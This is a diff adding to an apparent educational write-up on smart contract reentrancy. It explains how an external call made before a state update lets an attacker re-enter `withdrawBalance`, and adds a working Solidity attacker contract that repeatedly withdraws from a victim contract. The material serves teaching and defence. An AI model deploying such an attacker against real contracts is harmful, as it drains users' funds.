@@ -63,3 +63,25 @@ User A balance = 10 ether
 ```
 
 - The order of operations is really important in these situations. In our `withdrawBalance` function, we see that the function is making an external call _before_ updating the state of the contract.
+- What this means, is that an attacker could have that external call be made in such a way that it triggers a call of the `withdrawBalance` function again (hence - reentrancy).
+
+```js
+contract ReentrancyAttacker {
+    ReentrancyVictim victim;
+
+    constructor(ReentrancyVictim _victim) {
+        victim = _victim;
+    }
+
+    function attack() public payable {
+        victim.deposit{value: 1 ether}();
+        victim.withdrawBalance();
+    }
+
+    receive() external payable {
+        if (address(victim).balance >= 1 ether) {
+            victim.withdrawBalance();
+        }
+    }
+}
+```
